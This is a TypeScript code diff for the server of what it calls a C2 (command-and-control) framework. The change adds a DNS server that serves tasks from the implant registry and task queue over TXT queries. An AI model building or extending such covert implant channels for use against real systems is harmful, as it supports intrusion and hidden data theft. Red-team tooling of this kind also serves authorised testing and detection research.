@@ -14,6 +14,7 @@ import { createRouter } from "./api.js";
 import { createStagerRouter } from "./stager.js";
 import { createWsBroadcaster } from "./ws.js";
 import { createImplantWsServer } from "./implant-ws.js";
+import { createDnsServer } from "./dns.js";
 import type { C2ServerConfig } from "../types.js";
 
 const __dirname = dirname(fileURLToPath(import.meta.url));
@@ -88,6 +89,15 @@ export function startServer(cfg: Partial<C2ServerConfig> = {}): { close: () => v
   const router = createRouter(registry, taskQueue, config.apiKey, config.implantToken, broadcast);
   app.use(router);
 
+  let dnsServer: { start: () => Promise<void>; stop: () => Promise<void> } | null = null;
+  const dnsDomain = process.env.C2_DNS_DOMAIN;
+  const dnsPort = parseInt(process.env.C2_DNS_PORT || "53", 10);
+  if (dnsDomain) {
+    dnsServer = createDnsServer(dnsPort, dnsDomain, registry, taskQueue);
+    dnsServer.start().catch((err) => console.error(`  DNS server error: ${err.message}`));
+    console.log(`  DNS:   ${dnsDomain} on :${dnsPort} (TXT queries)`);
+  }
+
   httpServer.listen(config.port, config.host, () => {
     const host = config.host === "0.0.0.0" ? "localhost" : config.host;
     console.log(`  C2 server listening on ${host}:${config.port} (${protocol})`);
@@ -101,6 +111,7 @@ export function startServer(cfg: Partial<C2ServerConfig> = {}): { close: () => v
   return {
     close: () => {
       clearInterval(pruneTimer);
+      if (dnsServer) dnsServer.stop().catch(() => {});
       httpServer.close();
       closeDb();
     },
